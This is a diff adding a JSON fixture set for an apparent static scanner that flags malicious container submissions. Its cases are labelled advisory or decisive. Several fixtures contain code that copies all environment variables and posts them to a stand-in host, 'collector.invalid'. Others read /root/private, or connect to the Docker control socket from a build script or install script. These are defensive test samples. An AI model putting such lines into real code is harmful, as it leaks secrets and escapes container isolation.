@@ -1,0 +1,93 @@
+{
+  "revision": "static-malicious-preflight-v2",
+  "sanitization": "Synthetic structural fixtures only; no miner source, identifiers, prompts, credentials, or challenge values.",
+  "cases": [
+    {
+      "id": "safe-excluded-local-python-helper",
+      "expected": "advisory",
+      "category": "data_exfiltration",
+      "files": {
+        "Dockerfile": "FROM python:3.12\nCOPY app.py /app/app.py\nENTRYPOINT [\"python\", \"/app/app.py\"]\n",
+        "app.py": "print('ready')\n",
+        "tools/local_diagnostic.py": "secret = os.environ.copy()\nrequests.post('https://collector.invalid', json=secret)\n"
+      }
+    },
+    {
+      "id": "safe-loopback-diagnostic",
+      "expected": "advisory",
+      "category": "data_exfiltration",
+      "files": {
+        "Dockerfile": "FROM python:3.12\nCOPY app.py /app/app.py\nENTRYPOINT [\"python\", \"/app/app.py\"]\n",
+        "app.py": "secret = os.environ.copy()\nrequests.post('http://127.0.0.1:8080/debug', json=secret)\n"
+      }
+    },
+    {
+      "id": "safe-unrelated-environment-and-post",
+      "expected": "advisory",
+      "category": "data_exfiltration",
+      "files": {
+        "Dockerfile": "FROM python:3.12\nCOPY app.py /app/app.py\nENTRYPOINT [\"python\", \"/app/app.py\"]\n",
+        "app.py": "secret = os.environ.copy()\nrequests.post('https://collector.invalid/health', json={'ok': True})\n"
+      }
+    },
+    {
+      "id": "safe-rust-cfg-test-cross-user-read",
+      "expected": "advisory",
+      "category": "cross_user_access",
+      "files": {
+        "Dockerfile": "FROM rust:bookworm AS build\nCOPY . .\nRUN cargo build --release\nFROM scratch\nCOPY --from=build /target/release/app /app\nENTRYPOINT [\"/app\"]\n",
+        "Cargo.toml": "[package]\nname='app'\nversion='0.1.0'\n",
+        "src/main.rs": "#[cfg(test)]\nmod tests { fn local() { let path = \"/root/private\"; read(path); } }\nfn main() {}\n"
+      }
+    },
+    {
+      "id": "advisory-dynamic-rust-include",
+      "expected": "advisory",
+      "category": "cross_user_access",
+      "files": {
+        "Dockerfile": "FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
+        "Cargo.toml": "[package]\nname='app'\nversion='0.1.0'\n",
+        "src/main.rs": "include!(env!(\"GENERATED_SOURCE\"));\nfn main() {}\n",
+        "generated/local.rs": "let path = \"/root/private\"; read(path);\n"
+      }
+    },
+    {
+      "id": "violation-reachable-external-exfiltration",
+      "expected": "decisive",
+      "category": "data_exfiltration",
+      "files": {
+        "Dockerfile": "FROM python:3.12\nCOPY app.py /app/app.py\nENTRYPOINT [\"python\", \"/app/app.py\"]\n",
+        "app.py": "secret = os.environ.copy()\nrequests.post('https://collector.invalid/report', json=secret)\n"
+      }
+    },
+    {
+      "id": "violation-reachable-cross-user-read",
+      "expected": "decisive",
+      "category": "cross_user_access",
+      "files": {
+        "Dockerfile": "FROM python:3.12\nCOPY app.py /app/app.py\nENTRYPOINT [\"python\", \"/app/app.py\"]\n",
+        "app.py": "path = '/root/private'\nread(path)\n"
+      }
+    },
+    {
+      "id": "violation-reachable-build-script",
+      "expected": "decisive",
+      "category": "malicious_build",
+      "files": {
+        "Dockerfile": "FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
+        "Cargo.toml": "[package]\nname='app'\nversion='0.1.0'\nbuild='build.rs'\n",
+        "build.rs": "fn main() { let endpoint = \"/var/run/docker.sock\"; connect_control_socket(endpoint); }\n",
+        "src/main.rs": "fn main() {}\n"
+      }
+    },
+    {
+      "id": "violation-docker-invoked-shell",
+      "expected": "decisive",
+      "category": "malicious_build",
+      "files": {
+        "Dockerfile": "FROM alpine\nCOPY scripts/install.sh /install.sh\nRUN /install.sh\n",
+        "scripts/install.sh": "endpoint='/var/run/docker.sock'\nconnect_control_socket(endpoint)\n"
+      }
+    }
+  ]
+}
